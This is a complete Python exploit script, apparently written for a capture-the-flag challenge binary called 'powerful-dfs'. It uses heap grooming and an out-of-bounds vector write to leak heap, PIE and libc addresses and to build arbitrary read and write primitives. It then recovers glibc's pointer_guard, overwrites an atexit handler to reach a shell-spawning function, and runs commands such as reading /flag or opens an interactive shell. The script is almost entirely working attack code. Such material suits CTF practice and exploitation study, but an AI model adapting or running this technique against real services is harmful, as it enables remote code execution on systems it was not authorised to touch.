#!/usr/bin/env python3

import argparse
import os
import re
import select
import socket
import subprocess
import sys
import time
from collections import namedtuple

MASK = 0xffffffffffffffff

# offsets from the provided binary
OFF_WIN = 0x1c30
OFF_DFS_RUNNER = 0x1409
OFF_SYSTEM_GOT = 0xff60
OFF_PROBLEMS_VEC = 0x10040
OFF_JOBS_VEC = 0x10060
OFF_DSO_HANDLE = 0x10008
OFF_PROBLEMS_DTOR = 0x9760
OFF_JOBS_DTOR = 0x97ba

# offsets after the fixed heap grooming order
OFF_HEAP_LEAK = 0x24430
OFF_P2_DFS = 0x24690
OFF_JOBS_SLOT1 = 0x24668
OFF_FAKE_JOB = 0x24900

FAKE_JOB_ID = 0x13371337
FAKE_JOB_ID_DEC = 322376503

Profile = namedtuple('Profile', 'name system_off scans scan_len')
PROFILES = [
    # docker/ubuntu 24.04 glibc 2.39
    Profile('ubuntu24', 0x58750, [0x204000, 0x205000, 0x200000, 0x1f0000], 0x5000),
    # my local libc while testing
    Profile('local', 0x53110, [0x1e7000, 0x1e6000], 0x4000),
]


def log(msg):
    print(msg, flush=True)


def p64_to_ints(x):
    return [to_s32(x), to_s32(x >> 32)]


def ints_to_p64(v):
    if len(v) < 2:
        raise RuntimeError('need at least 2 dwords')
    return (to_u32(v[1]) << 32) | to_u32(v[0])


def to_u32(x):
    return x & 0xffffffff


def to_s32(x):
    x &= 0xffffffff
    return x - 0x100000000 if x & 0x80000000 else x


def rol(x, r):
    return ((x << r) | (x >> (64 - r))) & MASK


def ror(x, r):
    return ((x >> r) | (x << (64 - r))) & MASK


class Dead(Exception):
    pass


class Tube:
    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self._send(data)

    def sendline(self, data=b''):
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b'\n')

    def recvuntil(self, token, timeout=10):
        if isinstance(token, str):
            token = token.encode()

        end = time.time() + timeout
        while token not in self.buf:
            left = end - time.time()
            if left <= 0:
                tail = self.buf[-200:]
                raise Dead('timeout waiting for %r, tail=%r' % (token, tail))
            self._poll(left)

        idx = self.buf.index(token)
        out = self.buf[:idx + len(token)]
        self.buf = self.buf[idx + len(token):]
        return out

    def recvall_available(self, timeout=0.3):
        out = self.buf
        self.buf = b''
        end = time.time() + timeout
        while True:
            left = end - time.time()
            if left <= 0:
                break
            try:
                chunk = self._recv_once(left)
            except Dead:
                break
            if not chunk:
                break
            out += chunk
        return out

    def close(self):
        pass


class Remote(Tube):
    def __init__(self, host, port):
        self.io = socket.create_connection((host, port), timeout=8)
        self.io.setblocking(False)
        self.buf = b''

    def _send(self, data):
        self.io.sendall(data)

    def _poll(self, timeout):
        r, _, _ = select.select([self.io], [], [], timeout)
        if not r:
            return
        data = self.io.recv(0x10000)
        if not data:
            raise Dead('remote closed')
        self.buf += data

    def _recv_once(self, timeout):
        r, _, _ = select.select([self.io], [], [], timeout)
        if not r:
            return b''
        return self.io.recv(0x10000)

    def close(self):
        try:
            self.io.close()
        except Exception:
            pass

    def fd(self):
        return self.io.fileno()

    def raw_recv(self):
        try:
            return self.io.recv(0x10000)
        except BlockingIOError:
            return b''


class Local(Tube):
    def __init__(self, path):
        self.p = subprocess.Popen(
            [path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
        self.buf = b''

    def _send(self, data):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def _poll(self, timeout):
        r, _, _ = select.select([self.p.stdout], [], [], timeout)
        if not r:
            return
        data = os.read(self.p.stdout.fileno(), 0x10000)
        if not data:
            raise Dead('process closed')
        self.buf += data

    def _recv_once(self, timeout):
        r, _, _ = select.select([self.p.stdout], [], [], timeout)
        if not r:
            return b''
        return os.read(self.p.stdout.fileno(), 0x10000)

    def close(self):
        try:
            self.p.kill()
        except Exception:
            pass

    def fd(self):
        return self.p.stdout.fileno()

    def raw_recv(self):
        return os.read(self.p.stdout.fileno(), 0x10000)


def menu_new(t, n, edges):
    t.recvuntil(b'> ')
    t.sendline('1')
    t.recvuntil(b'Number of nodes: ')
    t.sendline(str(n))
    t.recvuntil(b'Number of edges: ')
    t.sendline(str(len(edges)))

    for i, (u, v) in enumerate(edges):
        t.recvuntil(('Edge %d (u v): ' % i).encode())
        t.sendline('%d %d' % (u, to_s32(v)))


def menu_run(t, idx, src):
    t.recvuntil(b'> ')
    t.sendline('2')
    t.recvuntil(b'Problem index: ')
    t.sendline(str(idx))
    t.recvuntil(b'Source node: ')
    t.sendline(str(src))


def menu_jobs(t):
    t.recvuntil(b'> ')
    t.sendline('3')
    return t.recvuntil(b'--- Powerful DFS Menu ---', timeout=20)


def build_fake_job(instance, src_marker, read_addr, size):
    # Job layout, written as int vector data.
    a = []
    a += [FAKE_JOB_ID, 0]                         # id + padding
    a += p64_to_ints(instance)                    # dfs_instance *
    a += p64_to_ints(src_marker)                  # source
    a += [1, 0]                                   # done=true
    a += p64_to_ints(0) * 3                       # visited = empty vector
    a += p64_to_ints(read_addr)                   # visit_order.begin
    a += p64_to_ints(read_addr + size)            # visit_order.end
    a += p64_to_ints(read_addr + size)            # visit_order.cap
    return (a + [0] * 24)[:24]


def parse_fake_job(out):
    s = out.decode(errors='replace')
    m = re.search(r'Job %d:.*?Visit Order: ([^\n]*)' % FAKE_JOB_ID_DEC, s, re.S)
    if not m:
        raise Dead('fake job not found, heap layout probably changed')
    return [int(x) for x in re.findall(r'-?\d+', m.group(1))]


def leak_heap(t):
    # Shape the first few objects.  The n=-1 case is useful because its vectors
    # stay empty, so later fake Job output is less noisy.
    menu_new(t, 1, [])
    menu_new(t, -1, [])

    menu_run(t, 0, 0)
    time.sleep(0.08)
    menu_run(t, 0, 0)
    time.sleep(0.08)
    menu_run(t, 1, 0)
    time.sleep(0.08)

    # adj[-4] overlaps the global jobs vector area in this heap layout.
    # Pushing 8 ints moves jobs[1] so view_jobs leaks a heap pointer as Source.
    menu_new(t, 2, [(-4, 0x41414141)] * 8)
    out = menu_jobs(t).decode(errors='replace')
    sources = [int(x) for x in re.findall(r'Source=(\d+)', out)]
    leaks = [x for x in sources if x > 0x100000000]
    if not leaks:
        raise Dead('heap leak failed')
    return leaks[0] - OFF_HEAP_LEAK


def install_fake_job(t, heap, first_read, size):
    fake_job = heap + OFF_FAKE_JOB
    p2_dfs = heap + OFF_P2_DFS

    # Put the fake Job object inside vertex-1's int buffer.
    menu_new(t, 10, [(1, x) for x in build_fake_job(p2_dfs, 0xdeadbeefcafebabe, first_read, size)])

    # Build a fake vector<int>.  Then adj[12].push_back() writes into jobs[1].
    slot = heap + OFF_JOBS_SLOT1
    fake_vec = [0x22222222] * 4
    fake_vec += p64_to_ints(0)
    fake_vec += p64_to_ints(slot)
    fake_vec += p64_to_ints(slot + 8)
    fake_vec += [0x33333333] * 2

    menu_new(t, 10, [(1, x) for x in fake_vec] + [(12, fake_job & 0xffffffff), (12, fake_job >> 32)])
    return fake_job


def arb_read_i32(t, fake_job, addr, size, idx=14):
    # Rewrite fake_job.visit_order = [addr, addr + size).
    vo = fake_job + 0x38
    fake_vec = [0x44444444] * 4
    fake_vec += p64_to_ints(0)
    fake_vec += p64_to_ints(vo)
    fake_vec += p64_to_ints(vo + 24)
    fake_vec += [0x55555555] * 2

    ptrs = p64_to_ints(addr) + p64_to_ints(addr + size) + p64_to_ints(addr + size)
    menu_new(t, 10, [(1, x) for x in fake_vec] + [(idx, x) for x in ptrs])
    return parse_fake_job(menu_jobs(t))


def arb_write_i32(t, addr, values, idx=14):
    # Make adj[idx] point to addr, then every push_back writes one dword there.
    fake_vec = [0x66666666] * 4
    fake_vec += p64_to_ints(0)
    fake_vec += p64_to_ints(addr)
    fake_vec += p64_to_ints(addr + 4 * len(values))
    fake_vec += [0x77777777] * 2
    menu_new(t, 10, [(1, x) for x in fake_vec] + [(idx, x) for x in values])


def dump_to_qwords(base, dwords):
    out = {}
    for i in range(0, len(dwords) - 1, 2):
        out[base + 4 * i] = ints_to_p64(dwords[i:i + 2])
    return out


def find_exit_entry(scan_base, dwords, pie):
    q = dump_to_qwords(scan_base, dwords)
    problems = pie + OFF_PROBLEMS_VEC
    jobs = pie + OFF_JOBS_VEC
    dso = pie + OFF_DSO_HANDLE

    found = []
    for addr, val in q.items():
        if val not in (problems, jobs):
            continue
        if q.get(addr - 16) != 4:      # ef_cxa flavor
            continue
        if q.get(addr + 8) != dso:
            continue

        enc_fn = q.get(addr - 8)
        if enc_fn is None:
            continue

        real_fn = pie + (OFF_JOBS_DTOR if val == jobs else OFF_PROBLEMS_DTOR)
        found.append((val, addr - 8, enc_fn, real_fn))

    # Either one works, but I normally hit the jobs destructor first.
    found.sort(key=lambda x: 0 if x[0] == jobs else 1)
    return found[0] if found else None


def pop_shell(t, one_shot=False, cmd=None):
    t.recvuntil(b'> ')
    t.sendline('5')
    time.sleep(0.25)

    if one_shot:
        if cmd is None:
            cmd = 'echo SHELL_OK; cat /flag 2>/dev/null || true; id; exit'
        t.sendline(cmd)
        if not cmd.rstrip().endswith('exit'):
            t.sendline('exit')
        time.sleep(0.5)
        return t.recvall_available(timeout=3), False

    # Check that win() really gave us a shell.  Do not exit afterwards.
    t.sendline('echo SHELL_OK; id')
    time.sleep(0.5)
    out = t.recvall_available(timeout=2)
    ok = b'SHELL_OK' in out or b'uid=' in out or b'BKISC{' in out
    return out, ok


def interactive(t):
    log('[*] shell is interactive now')
    log('[*] try: ls -la ; cat /flag ; id')

    pending = t.recvall_available(timeout=0.1)
    if pending:
        sys.stdout.buffer.write(pending)
        sys.stdout.buffer.flush()

    stdin_fd = sys.stdin.fileno()
    remote_fd = t.fd()

    try:
        while True:
            r, _, _ = select.select([stdin_fd, remote_fd], [], [])

            if remote_fd in r:
                data = t.raw_recv()
                if not data:
                    log('\n[*] remote closed')
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()

            if stdin_fd in r:
                data = os.read(stdin_fd, 0x1000)
                if not data:
                    log('\n[*] stdin closed')
                    break
                t.send(data)
    except KeyboardInterrupt:
        log('\n[*] stopped')


def connect(args):
    if args.local:
        return Local(args.binary)
    return Remote(args.host, args.port)


def exploit_once(args, prof, scan_off):
    t = connect(args)
    try:
        heap = leak_heap(t)
        log('[+] heap base-ish = %#x' % heap)

        fake_job = install_fake_job(t, heap, heap + OFF_HEAP_LEAK, 16)
        leak = parse_fake_job(menu_jobs(t))
        pie = ints_to_p64(leak[:2]) - OFF_DFS_RUNNER
        log('[+] PIE = %#x' % pie)

        system_got = pie + OFF_SYSTEM_GOT
        leak = arb_read_i32(t, fake_job, system_got, 8)
        system_addr = ints_to_p64(leak[:2])
        libc = system_addr - prof.system_off
        log('[+] system = %#x' % system_addr)
        log('[+] libc   = %#x (%s)' % (libc, prof.name))

        scan_base = libc + scan_off
        leak = arb_read_i32(t, fake_job, scan_base, prof.scan_len)
        hit = find_exit_entry(scan_base, leak, pie)
        if hit is None:
            log('[-] no __cxa_atexit entry at libc+%#x' % scan_off)
            t.close()
            return False

        arg, enc_addr, enc_dtor, real_dtor = hit
        guard = ror(enc_dtor, 17) ^ real_dtor
        win = pie + OFF_WIN
        enc_win = rol(win ^ guard, 17)

        log('[+] exit entry arg  = %#x' % arg)
        log('[+] encoded fn @    = %#x' % enc_addr)
        log('[+] pointer_guard  = %#x' % guard)
        log('[+] win            = %#x' % win)

        arb_write_i32(t, enc_addr, p64_to_ints(enc_win))
        log('[+] overwritten exit handler, leaving menu...')

        out, shell_ok = pop_shell(t, one_shot=args.one_shot, cmd=args.cmd)
        if out:
            sys.stdout.buffer.write(out)
            sys.stdout.buffer.flush()

        if args.one_shot:
            t.close()
            return b'SHELL_OK' in out or b'uid=' in out or b'BKISC{' in out

        if not shell_ok:
            log('[-] shell did not answer')
            t.close()
            return False

        if args.cmd:
            t.sendline(args.cmd)
        interactive(t)
        t.close()
        return True

    except Exception as e:
        log('[-] failed: %s' % e)
        t.close()
        return False


def parse_int(x):
    return int(x, 0)


def choose_profiles(args):
    profs = PROFILES[:]
    if args.profile != 'auto':
        profs = [p for p in profs if p.name == args.profile]

    if args.system_off is not None:
        base = profs[0] if profs else PROFILES[0]
        scans = args.scan_off if args.scan_off else base.scans
        profs = [Profile('custom', args.system_off, scans, base.scan_len)]
    elif args.scan_off:
        profs = [Profile(p.name, p.system_off, args.scan_off, p.scan_len) for p in profs]

    return profs


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=5000)
    ap.add_argument('--local', action='store_true')
    ap.add_argument('--binary', default='./src/powerful-dfs')
    ap.add_argument('--profile', choices=['auto'] + [p.name for p in PROFILES], default='auto')
    ap.add_argument('--system-off', type=parse_int, default=None)
    ap.add_argument('--scan-off', type=parse_int, action='append')
    ap.add_argument('--one-shot', action='store_true', help='run command and exit instead of interactive shell')
    ap.add_argument('--cmd', default=None, help='command to run after shell spawn')
    args = ap.parse_args()

    for prof in choose_profiles(args):
        for scan in prof.scans:
            log('[*] trying %s: system_off=%#x scan=%#x' % (prof.name, prof.system_off, scan))
            if exploit_once(args, prof, scan):
                return 0

    log('[-] no luck. Try --profile local or pass --system-off/--scan-off for another libc')
    return 1


if __name__ == '__main__':
    sys.exit(main())
